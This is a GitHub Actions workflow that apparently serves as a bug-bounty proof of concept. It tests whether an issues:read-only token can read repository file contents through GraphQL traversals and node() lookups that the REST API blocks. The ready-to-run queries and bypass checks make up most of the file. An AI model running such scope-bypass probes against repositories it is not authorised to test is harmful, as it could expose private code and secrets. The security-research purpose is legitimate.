name: GraphQL Scope Bypass Test
on:
  workflow_dispatch: {}

permissions:
  issues: read

jobs:
  scope-test:
    runs-on: ubuntu-latest
    steps:
      - name: Verify token lacks contents permission
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "============================================"
          echo "  GraphQL Scope Bypass Test"
          echo "  Token permissions: issues:read ONLY"
          echo "============================================"
          echo ""

          echo "=== TEST 1: REST API contents access (SHOULD FAIL - 403) ==="
          REST_STATUS=$(curl -s -o /tmp/rest_response.json -w "%{http_code}" \
            -H "Authorization: bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/jayantkamble10000/graphql-bounty-test/contents/secret_config.txt)
          echo "REST API status: $REST_STATUS"
          cat /tmp/rest_response.json | jq -r '.message // .content' 2>/dev/null || cat /tmp/rest_response.json
          echo ""
          
          if [ "$REST_STATUS" = "403" ]; then
            echo "CONFIRMED: Token correctly BLOCKED from reading contents via REST API"
          elif [ "$REST_STATUS" = "200" ]; then
            echo "WARNING: Token CAN read contents via REST - test may be invalid"
          fi
          echo ""
          
          echo "=== TEST 2: GraphQL - Issue->ClosedEvent->Commit->Tree->Blob traversal ==="
          echo "If this returns file text, it is a SCOPE BYPASS"
          TRAVERSAL=$(curl -s -H "Authorization: bearer $GH_TOKEN" \
            -H "Content-Type: application/json" \
            https://api.github.com/graphql \
            -d '{"query":"{ repository(owner: \"jayantkamble10000\", name: \"graphql-bounty-test\") { issues(first: 1, states: CLOSED) { nodes { number title timelineItems(first: 50) { nodes { __typename ... on ClosedEvent { closer { __typename ... on Commit { oid message tree { entries { name object { __typename ... on Blob { text byteSize } } } } } } } } } } } } }"}')
          echo "$TRAVERSAL" | jq .
          
          # Check if text field is non-null
          TEXT_VALUE=$(echo "$TRAVERSAL" | jq -r '.data.repository.issues.nodes[0].timelineItems.nodes[0].closer.tree.entries[0].object.text // "NULL"')
          echo ""
          if [ "$TEXT_VALUE" != "NULL" ] && [ "$TEXT_VALUE" != "null" ] && [ -n "$TEXT_VALUE" ]; then
            echo "*** SCOPE BYPASS CONFIRMED ***"
            echo "File contents exposed: $TEXT_VALUE"
          else
            echo "No bypass - tree/blob content correctly blocked"
          fi
          echo ""
          
          echo "=== TEST 3: GraphQL - Direct node() access to Commit ==="
          COMMIT_NODE=$(curl -s -H "Authorization: bearer $GH_TOKEN" \
            -H "Content-Type: application/json" \
            https://api.github.com/graphql \
            -d '{"query":"{ node(id: \"C_kwDOTqemKtoAKDAyNzM0NzFlNjcyMDY2MjBkMmM3OTQ2OWU0OWRiN2IwOTgxYWIyMWY\") { __typename ... on Commit { oid message tree { entries { name object { __typename ... on Blob { text } } } } } } }"}')
          echo "$COMMIT_NODE" | jq .
          echo ""
          
          echo "=== TEST 4: GraphQL - Direct node() access to Blob ==="
          BLOB_NODE=$(curl -s -H "Authorization: bearer $GH_TOKEN" \
            -H "Content-Type: application/json" \
            https://api.github.com/graphql \
            -d '{"query":"{ node(id: \"B_kwDOTqemKtoAKDI4NzRiN2Y0OTBkYjRhYzBmOGMwMDRkMTJhMjgzNTc3YjE2Yzk4NDU\") { __typename ... on Blob { text byteSize } } }"}')
          echo "$BLOB_NODE" | jq .
          echo ""
          
          echo "=== TEST 5: GraphQL - Direct node() access to Tree ==="
          TREE_NODE=$(curl -s -H "Authorization: bearer $GH_TOKEN" \
            -H "Content-Type: application/json" \
            https://api.github.com/graphql \
            -d '{"query":"{ node(id: \"TREE_kwDOTqemKtoAKDU5YjA0ZDYwZjdlMTJlN2E1YzFjNDM2YmRhNjIyYWE4YmU0N2I0Nzk\") { __typename ... on Tree { oid entries { name object { __typename ... on Blob { text } } } } } }"}')
          echo "$TREE_NODE" | jq .
          echo ""
          
          echo "=== TEST 6: REST API - Issues access (SHOULD SUCCEED) ==="
          ISSUES_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -H "Authorization: bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/jayantkamble10000/graphql-bounty-test/issues)
          echo "Issues REST API status: $ISSUES_STATUS"
          echo ""
          
          echo "=== TEST 7: REST API - Git Blob access (SHOULD FAIL - 403) ==="
          GITBLOB_STATUS=$(curl -s -o /tmp/gitblob_response.json -w "%{http_code}" \
            -H "Authorization: bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/jayantkamble10000/graphql-bounty-test/git/blobs/2874b7f490db4ac0f8c004d12a283577b16c9845)
          echo "Git Blob REST API status: $GITBLOB_STATUS"
          cat /tmp/gitblob_response.json | jq -r '.message // .content' 2>/dev/null || cat /tmp/gitblob_response.json
          echo ""
          
          echo "============================================"
          echo "  SUMMARY"
          echo "============================================"
          echo "REST contents:  $REST_STATUS (expect 403)"
          echo "REST issues:    $ISSUES_STATUS (expect 200)"
          echo "REST git/blob:  $GITBLOB_STATUS (expect 403)"
          if [ "$TEXT_VALUE" != "NULL" ] && [ "$TEXT_VALUE" != "null" ] && [ -n "$TEXT_VALUE" ]; then
            echo "GraphQL traversal: BYPASSED - returned file content"
            echo "VERDICT: *** SCOPE BYPASS VULNERABILITY ***"
          else
            echo "GraphQL traversal: BLOCKED"
            echo "VERDICT: No vulnerability found"
          fi
